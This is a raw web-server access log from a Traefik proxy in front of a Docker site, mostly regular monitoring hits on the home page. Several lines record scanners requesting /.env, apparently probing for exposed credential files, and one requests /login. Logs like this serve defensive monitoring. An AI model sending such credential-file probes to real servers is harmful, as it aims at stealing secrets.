159.203.109.206 - - [20/Dec/2023:07:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 939 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:57:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 940 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 941 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:58:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 942 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 943 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:59:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 944 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 945 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:00:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 946 "www@docker" "http://172.20.0.9:80" 1ms
45.79.168.172 - - [20/Dec/2023:08:01:03 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 947 "-" "-" 0ms
185.233.19.183 - - [20/Dec/2023:08:01:19 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 948 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:08:01:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 949 "www@docker" "http://172.20.0.9:80" 0ms
45.79.181.179 - - [20/Dec/2023:08:01:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 950 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:08:01:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 951 "www@docker" "http://172.20.0.9:80" 1ms
167.94.138.125 - - [20/Dec/2023:08:02:09 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 952 "-" "-" 0ms
167.94.138.125 - - [20/Dec/2023:08:02:12 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 953 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:08:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 954 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:02:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 955 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:03:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 956 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:03:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 957 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:08:03:50 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 958 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:08:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 959 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:04:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 960 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:05:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 961 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:05:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 962 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 963 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:06:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 964 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:07:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 965 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:07:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 966 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:08:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 967 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:08:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 968 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:09:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 969 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:09:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 970 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:10:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 971 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:10:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 972 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:11:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 973 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:11:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 974 "www@docker" "http://172.20.0.9:80" 1ms
95.214.235.169 - - [20/Dec/2023:08:12:11 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 975 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [20/Dec/2023:08:12:11 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 976 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:08:12:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 977 "www@docker" "http://172.20.0.9:80" 1ms
57.129.23.166 - - [20/Dec/2023:08:12:26 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 978 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:08:12:26 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 979 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:08:12:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 980 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:13:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 981 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:13:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 982 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:14:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 983 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:14:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 984 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:15:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 985 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:15:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 986 "www@docker" "http://172.20.0.9:80" 0ms
34.76.158.233 - - [20/Dec/2023:08:16:18 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 987 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:08:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 988 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:08:16:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 989 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 990 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:17:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 991 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:18:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 992 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:18:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 993 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 994 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:19:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 995 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 996 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:20:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 997 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 998 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:21:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 999 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1000 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:22:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1001 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1002 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:23:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1003 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1004 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:24:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1005 "www@docker" "http://172.20.0.9:80" 0ms
78.153.140.221 - - [20/Dec/2023:08:24:38 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1006 "-" "-" 0ms
78.153.140.221 - - [20/Dec/2023:08:24:39 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1007 "-" "-" 0ms
45.79.168.172 - - [20/Dec/2023:08:24:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1008 "-" "-" 0ms
192.155.90.220 - - [20/Dec/2023:08:24:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1009 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:08:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1010 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:25:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1011 "www@docker" "http://172.20.0.9:80" 0ms
192.241.231.47 - - [20/Dec/2023:08:26:09 +0000] "GET /login HTTP/1.1" 404 19 "-" "-" 1012 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:08:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1013 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:26:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1014 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1015 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:27:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1016 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1017 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:28:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1018 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1019 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:08:29:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1020 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1021 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:30:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1022 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1023 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:31:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1024 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1025 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:32:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1026 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1027 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:33:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1028 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1029 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:34:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1030 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1031 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:35:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1032 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:36:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1033 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:36:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1034 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:37:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1035 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:37:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1036 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:38:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1037 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:38:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1038 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1039 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:39:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1040 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:40:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1041 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:40:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1042 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:41:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1043 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:41:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1044 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:42:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1045 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:42:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1046 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:43:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1047 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:43:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1048 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:44:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1049 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:44:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1050 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:45:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1051 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:45:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1052 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:46:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1053 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:46:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1054 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:47:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1055 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:47:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1056 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:48:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1057 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:48:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1058 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1059 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:49:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1060 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1061 "www@docker" "http://172.20.0.9:80" 0ms
107.170.225.18 - - [20/Dec/2023:08:50:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1062 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:08:50:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1063 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1064 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:51:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1065 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1066 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:52:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1067 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1068 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:53:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1069 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1070 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:54:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1071 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1072 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:55:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1073 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:08:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1074 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:08:56:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1075 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1076 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:57:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1077 "www@docker" "http://172.20.0.9:80" 1ms
34.76.158.233 - - [20/Dec/2023:08:57:40 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1078 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:08:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1079 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:58:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1080 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:08:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1081 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:08:59:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1082 "www@docker" "http://172.20.0.9:80" 0ms
198.235.24.245 - - [20/Dec/2023:08:59:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1083 "-" "-" 0ms
95.214.235.169 - - [20/Dec/2023:08:59:48 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1084 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [20/Dec/2023:08:59:53 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1085 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1086 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:00:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1087 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:01:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1088 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:01:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1089 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1090 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:09:02:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1091 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:03:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1092 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:03:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1093 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1094 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:04:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1095 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:05:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1096 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:05:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1097 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1098 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:06:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1099 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:07:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1100 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:07:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1101 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:08:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1102 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:08:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1103 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:09:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1104 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:09:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1105 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:10:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1106 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:10:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1107 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:11:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1108 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:11:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1109 "www@docker" "http://172.20.0.9:80" 1ms
198.235.24.220 - - [20/Dec/2023:09:12:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1110 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:12:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1111 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:12:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1112 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:09:12:42 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1113 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:13:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1114 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:13:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1115 "www@docker" "http://172.20.0.9:80" 0ms
198.74.56.46 - - [20/Dec/2023:09:14:10 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1116 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:14:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1117 "www@docker" "http://172.20.0.9:80" 1ms
172.104.11.4 - - [20/Dec/2023:09:14:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1118 "-" "-" 0ms
54.36.115.221 - - [20/Dec/2023:09:14:28 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1119 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [20/Dec/2023:09:14:28 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1120 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:09:14:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1121 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:15:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1122 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:15:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1123 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:09:16:19 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1124 "web-to-websecure@internal" "-" 0ms
